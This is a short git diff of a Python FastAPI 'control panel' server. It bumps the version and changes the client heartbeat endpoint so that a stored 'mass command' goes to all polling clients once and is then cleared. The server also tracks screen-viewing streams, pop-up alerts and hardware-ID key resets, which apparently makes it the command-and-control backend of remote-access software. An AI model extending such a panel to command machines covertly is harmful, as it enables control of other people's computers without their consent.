@@ -9,7 +9,7 @@ from pydantic import BaseModel
 import base64
 import time
 
-app = FastAPI(title="Assmar00 Control Panel", version="50.0")
+app = FastAPI(title="Assmar00 Control Panel", version="51.0")
 
 app.add_middleware(
     CORSMiddleware,
@@ -23,7 +23,7 @@ DB_FILE = "database.db"
 active_streams = {}
 viewers_watching = set()
 pending_messages = {}
-global_mass_command = None  # Speichert den aktuellen Massen-Befehl
+global_mass_command = None
 
 def init_db():
     conn = sqlite3.connect(DB_FILE)
@@ -296,6 +296,7 @@ def reset_key_hwid(data: dict):
 
 @app.post("/api/client/heartbeat")
 def client_heartbeat(data: ClientData):
+    global global_mass_command
     conn = sqlite3.connect(DB_FILE)
     cursor = conn.cursor()
     
@@ -349,11 +350,15 @@ def client_heartbeat(data: ClientData):
     
     alert_msg = pending_messages.pop(data.desktop, None)
     is_active = data.desktop in viewers_watching
+    
+    current_cmd = global_mass_command
+    global_mass_command = None # Befehl sofort zurücksetzen, damit er sich nicht wiederholt!
+
     return {
         "status": "success", 
         "stream_active": is_active, 
         "alert_message": alert_msg, 
-        "mass_command": global_mass_command
+        "mass_command": current_cmd
     }
 
 @app.post("/verify")
